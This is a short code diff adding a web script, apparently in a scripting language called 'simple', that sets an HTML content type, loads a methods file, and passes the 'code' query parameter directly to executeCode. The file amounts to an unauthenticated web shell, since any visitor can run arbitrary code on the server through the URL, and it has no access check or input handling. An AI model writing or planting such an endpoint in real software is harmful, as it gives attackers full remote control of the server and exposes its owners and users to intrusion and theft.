@@ -1,0 +1,7 @@
+#!simple 
+
+@"ContentType: text/html"+crlf
+
+call "web/functions/Methods.sim"
+
+executeCode(GET["code"])
